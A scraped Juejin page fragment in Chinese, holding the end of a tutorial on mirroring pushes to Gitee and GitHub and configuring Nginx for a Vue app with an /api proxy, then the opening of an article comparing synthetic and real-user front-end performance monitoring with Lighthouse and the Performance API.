<pre><code class="hljs language-js" lang="js"># 给 origin 添加第二个 push 地址
git remote set-url --add --push origin <span class="hljs-attr">https</span>:<span class="hljs-comment">//gitee.com/你的用户名/项目名.git</span>
git remote set-url --add --push origin <span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/你的用户名/vue-admin-deploy.git</span>

# 验证
git remote -v

# 以后只需要执行这一条，就会同时推送到 <span class="hljs-title class_">Gitee</span> 和 <span class="hljs-title class_">GitHub</span>
git push origin master
</code></pre>
<p>这时候在master分支提交代码，去github的Actions下去查看部署流程就ok了。</p>
<h2 data-id="heading-9">四、 服务器配置：Nginx 反向代理与 404 修复</h2>
<p>部署上线后，常见的问题是刷新页面 404，或者接口请求 404。这是因为线上失去了 Vite 的开发代理，必须靠 Nginx。</p>
<h4 data-id="heading-10">1. 统一接口前缀</h4>
<p>为了方便 Nginx 转发，建议前后端统一使用 /api 前缀。</p>
<ul>
<li><strong>前端</strong>：.env.production 设置 VITE_API_BASE_URL = '/api'</li>
<li><strong>后端</strong>：Express 入口文件挂载 app.use('/api/auth', authRouter)</li>
</ul>
<h4 data-id="heading-11">2. Nginx 配置 (完整版)</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># HTTP 强制跳转 HTTPS (保持不变)</span>
server {
    listen 80;
    server_name ifxia.xyz;
    <span class="hljs-built_in">return</span> 301 https://$host<span class="hljs-variable">$request_uri</span>;
}

<span class="hljs-comment"># HTTPS 服务器</span>
server {
    listen 443 ssl;
    server_name ifxia.xyz;

    <span class="hljs-comment"># SSL 配置 (保持你原来的)</span>
    ssl_certificate /etc/letsencrypt/live/ifxia.xyz/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ifxia.xyz/privkey.pem;

<span class="hljs-comment"># 这样 /var/www/html 下的 index.html 就变成了官网</span>
    root /var/www/html;
    index index.html index.htm;



    <span class="hljs-comment"># --- 1. 前端配置 (子路径) ---</span>
    location /vue-admin-template {
        <span class="hljs-comment"># 使用 alias 指向存放前端代码的实际目录</span>
        <span class="hljs-built_in">alias</span> /var/www/html/vue-admin-template;
        index index.html;
        <span class="hljs-comment"># 解决 Vue Router 刷新 404 问题</span>
        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /vue-admin-template/index.html;
    }


   
    <span class="hljs-comment"># --- 2. 后端接口 (统一入口) ---</span>
    <span class="hljs-comment"># 只要是 /api 开头的，全部给 Node.js</span>
    location /api/ {
        <span class="hljs-comment"># ⚠️ 注意：这里结尾不要加 /</span>
        <span class="hljs-comment"># 不加 / 意味着：把 /api/auth/login 原样发给 Node</span>
        <span class="hljs-comment"># 因为Node端已经配置了 app.use('/api/auth', ...)，所以正好匹配</span>
        proxy_pass http://localhost:3000;
        
        proxy_set_header Host <span class="hljs-variable">$host</span>;
        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;
        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
    }
  
}
</code></pre>
<p>验证并重启nginx</p>
<pre><code class="hljs language-js" lang="js">nginx -t

systemctl reload nginx
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大道至简：万字漫谈前端性能监控]]></title>    <link>https://juejin.cn/post/7583973472324009999</link>    <guid>https://juejin.cn/post/7583973472324009999</guid>    <pubDate>2025-12-16T06:38:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472324009999" data-draft-id="7583973472323895311" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大道至简：万字漫谈前端性能监控"/> <meta itemprop="keywords" content="前端,性能优化,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T06:38:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tabzzz"/> <meta itemprop="url" content="https://juejin.cn/user/2571086155752654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大道至简：万字漫谈前端性能监控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2571086155752654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tabzzz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:38:34.000Z" title="Tue Dec 16 2025 06:38:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">前言</h2>
<p>在2025年的今天，针对xx监控这几个字眼已经有点“老生常谈”的感觉了，无论是什么数据监控、异常监控或者是本文即将要分享的性能监控，在当今他们并不是做为一种“新东西”来供大家学习，而是经常以一种“老朋友”的姿态和大家见面。</p>
<p>随着前端页面的日益复杂，交互、初始化等功能不断增加，性能监控已经不再是一个可选的附加项，而是开发过程中不可或缺的一部分。我们可以把性能监控比作前端开发中的“健康检查”，它像是医生对页面的体检，帮助我们及时发现潜在的问题，避免那些用户体验上的“隐形杀手”。</p>
<p>还是那句话，谁不想让网页快一点、访问起来爽一些呢？</p>
<h2 data-id="heading-1">网站性能的影响</h2>
<h3 data-id="heading-2">对用户的影响</h3>
<p>你打开网站可以等待的时间是多少呢？你是否确定用户为了访问你的网站可以等上1秒？5秒？或者是10秒吗🤔？</p>
<p>就我个人来说，在访问各类网站时，如果响应时间过长的话会让我觉得很“不舒服”，可能在某些PC等久点会好一些，但是如果是移动端，那简直是“无法忍受”的程度。</p>
<p>事实上，有统计指出加载延迟每增加<strong>100毫秒，用户满意度下降约1%，<strong>一般来说，<strong>网站响应时间2秒以内</strong>通常被认为是用户可接受的阈值，超过3秒时，用户流失率显著增加，当等待时间超过</strong>8秒</strong>时，大多数用户会放弃访问，达到12秒则<strong>99%以上用户选择关闭网页</strong>。</p>
<p>单纯从用户转换率和跳出率来讲，可能没法从冰冷的数字中感受出网站性能对用户流失的影响有多大，但是对于某些每年有巨大营收的公司来说，这一点点的延迟加载会对业务造成沉重的打击。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0ebe186586a4b35937f9e51e7cddc7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=2t15SmC6Rw8fNbp5O3twQVXfzTk%3D" alt="Clipboard_Screenshot_1765866202.png" loading="lazy"/></p>
<p>亚马逊前软件工程师 Greg Linden 曾在2006年发现每多出100ms延迟就会导致约1%销售损失，即使是非常小的延迟也会导致收入大幅下降，代价高昂。<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.conductor.com%2Facademy%2Fpage-speed-resources%2Ffaq%2Famazon-page-speed-study%2F" target="_blank" title="https://www.conductor.com/academy/page-speed-resources/faq/amazon-page-speed-study/" ref="nofollow noopener noreferrer">原文</a></p>
<h3 data-id="heading-3">对搜索引擎的影响</h3>
<p>除了直观的对用户造成影响以外，性能因素对搜索引擎的排名也有较大的影响。</p>
<p>早在2010年，Google在排名算法中就已经把页面加载速度作为一个重要因素。页面加载速度越快，搜索引擎越可能给予该页面更高的排名。反之，如果页面加载缓慢，搜索引擎可能会降低其在搜索结果中的排名，导致网站流量下降。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6cb868d2d9e43a88c245d8a8773c969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=m871NSqZ%2By9OGHNGZYgytWsTgi8%3D" alt="Clipboard_Screenshot_1765866216.png" loading="lazy"/></p>
<p>Google在2018年发布了 <strong>“<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fsearch%2Fdocs%2Fcrawling-indexing%2Fmobile%2Fmobile-sites-mobile-first-indexing%3Fhl%3Dzh-cn" target="_blank" title="https://developers.google.com/search/docs/crawling-indexing/mobile/mobile-sites-mobile-first-indexing?hl=zh-cn" ref="nofollow noopener noreferrer">Mobile-First Indexing</a>”</strong> ，即优先使用移动版内容来进行排名。如果网站在移动端加载缓慢或者交互体验差，搜索引擎会优先降级该网站的排名，影响其在搜索结果中的表现。</p>
<p>总而言之言而总之，在现代开发中，想要你自己的应用在搜索引擎中脱颖而出，性能早已是不可忽略的关键因素。</p>
<h3 data-id="heading-4">对开发和维护成本的影响</h3>
<p>如果不在开发初期就关注性能，后期可能会积累大量的技术债务，增加维护难度。性能问题往往表现为页面响应慢、资源加载失败等，这些问题如果没有及时解决，可能会成为日后开发迭代的阻碍。</p>
<h2 data-id="heading-5">性能监控的两种方案</h2>
<p>即使性能监控这个话题已经广泛讨论过，但随着技术演变，它也需要不断地更新进化。如今，性能监控不仅仅是用来检测页面加载是否顺畅，还承担着预警、数据分析和优化决策等多重角色。</p>
<p>性能监控分为两大类：<strong>合成监控</strong>和<strong>真实用户监控</strong>。</p>
<h3 data-id="heading-6">合成监控</h3>
<p>合成监控（Synthetic Monitoring, SYN）是<strong>通过模拟用户的行为来评估网站或应用的性能</strong>。模拟用户可以是脚本或专用工具，它们在指定的时间间隔内发起请求，模拟实际用户访问，并通过预定的测试场景收集各种性能指标。SYN监控通常用于检测性能瓶颈、服务可用性、响应时间等指标，<strong>适用于在没有真实用户流量时进行监控</strong>。</p>
<p>开发中我们可以用市面上较为成熟的合成监控工具进行测量，知名度比较高的应该还属<strong>LightHouse</strong>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fpagespeed.web.dev%2F" target="_blank" title="https://pagespeed.web.dev/" ref="nofollow noopener noreferrer">Google Pagespeed Insights</a>。</p>
<p>假设我们现在想用LightHouse来监测React官网的性能如何，我们可以先本地安装一下LightHouse：</p>
<pre><code class="hljs language-powershell" lang="powershell">npm install -g lighthouse
</code></pre>
<p>这里指定监测网站并将报告输出为HTML文件：</p>
<pre><code class="hljs language-powershell" lang="powershell">lighthouse &lt;https://zh-hans.react.dev/&gt; --output html --output-path ./report.html
</code></pre>
<p>监测结果页差不多长这样：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60940cc6eddc4c7e8dad64eca94a7120~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=ZlEJYnt%2FaMeE18b%2BIJKxNPrRMb0%3D" alt="Clipboard_Screenshot_1765866239.png" loading="lazy"/>
从LightHouse生成的结果来看，React官网看起来不是很“好”，那是否证明React官网真的不够好呢？实际未必。</p>
<p>合成监控是存在局限性的。</p>
<p>不同工具对性能指标的重视程度不同，这意味着不同的工具<strong>监控指标很可能权重不一致，监测方法也会存在一定的差异</strong>。如某些工具侧重页面加载时间，而其他工具可能更关注交互延迟等。另外，工具使用的测试环境、设备性能、网络状况和浏览器版本也有所不同，进一步影响了监测结果的准确性。因此，<strong>同一网站在不同合成监控工具下可能会得出不同的性能评估数据</strong>。</p>
<p>总结来说：</p>
<p>合成监控有一些显而易见的优点：</p>
<ol>
<li>实现简单，解决方案成熟</li>
<li>可以采集到更丰富的数据</li>
<li>不影响真实用户的访问性能</li>
<li>提供多种可视化分析</li>
</ol>
<p>但同时合成监控也仍存一些局限：</p>
<ol>
<li>无法真实还原所有场景，考虑因素较少</li>
<li>登陆等场景需要额外解决（强制登陆页或管理平台页）</li>
<li>单次执行数据不稳定，数据量过小</li>
</ol>
<h3 data-id="heading-7">真实用户监控</h3>
<p>真实用户监控（Real User Monitoring, RUM）是<strong>通过收集实际用户在访问网站或应用时的性能数据来评估性能</strong>。RUM 监控不依赖于模拟用户或脚本，而是直接从用户的设备中获取数据，捕捉他们的交互行为和页面加载时间。</p>
<blockquote>
<p>通常来讲，在看NetWork里面的请求时，有一堆看不懂的字符串一般都是内容上报hh</p>
</blockquote>
<p>下面是一个真实用户监控的流程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa8774f9a94544408eccccead42308b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=y7oMjmensHWDAwcv47a6Yw1VfiU%3D" alt="Clipboard_Screenshot_1765866261.png" loading="lazy"/></p>
<p>真实用户监控看起来very good，毕竟是基于”真实“的数据进行监控，但是真实用户监控也存在一定的局限性，主要体现在数据的代表性和采集的复杂性上。</p>
<p>由于 RUM 是基于实际用户的行为进行监测，因此<strong>不同用户在不同设备、网络环境和地理位置下的体验差异可能导致数据的不一致</strong>。由于用户行为多样性，RUM 无法在短时间内提供全面的性能评估，尤其是在流量较小或访问量较低的情况下，数据可能存在一定的偏差，不足以支撑性能分析的全面性。</p>
<p>总结来说：</p>
<p>真实用户监控有一些nice的点：</p>
<ol>
<li>无需模拟，完全还原真实场景</li>
<li>不存在登陆等需要额外解决的场景</li>
<li>在数据量足够庞大时，分析结果总是好的</li>
</ol>
<p>但是也存在一些bad点：</p>
<ol>
<li>可能会影响真实用户的使用感受</li>
<li>无法采集硬件相关指标</li>
<li>无法采集完整的资源加载瀑布图（现代平台其实很多都可以）</li>
<li>无法可视化展示页面的加载过程（现代平台其实很多也都可以）</li>
</ol>
<h3 data-id="heading-8">如何选择合适的方案</h3>
<ul>
<li><strong>合成监控</strong>更适合在<strong>开发阶段</strong>和<strong>上线前</strong>做性能优化，帮助发现一些潜在的性能瓶颈，并且不依赖真实用户的访问量，适合做定期的监控和预警。</li>
<li><strong>真实用户监控</strong>更适合用来<strong>持续监控</strong>网站或应用的性能，并且可以了解不同用户群体在真实环境下的使用体验，尤其对于<strong>大规模的实时监控</strong>、<strong>跨设备</strong>和<strong>跨网络环境</strong>的表现非常有帮助。</li>
</ul>
<h2 data-id="heading-9">真实用户性能数据的采集方案</h2>
<p>ps：合成监控的知识相对比较单一，常用的工具基本都是开箱即用。结合实际来讲，开发中其实更多是需要我们掌握的事真实用户性能数据的采集和分析，这里和大家分享一下RUM的相关内容:)</p>
<h3 data-id="heading-10">Performance API 介绍</h3>
<p>在JS中，主要进行性能数据采集的API都属于浏览器提供的Web Performance API的范畴，基于用途可以分为以下八类：</p>
<blockquote>
<p>写在前面： 原生的PerformanceAPI固然很好，但是实际业务中使用的时候还要结合实际情况分析。 抛出一个引子：例如你的页面首先展示Loading态，你的业务中并不认为Loading态加载出来时是第一个元素加载的时间（可能以页面业务元素为准），但是默认一些API会认为Loading态就是“理所应当”的第一个元素。 所以说也不要一把梭哈就用PerformanceAPI一条路走到死噢～</p>
</blockquote>
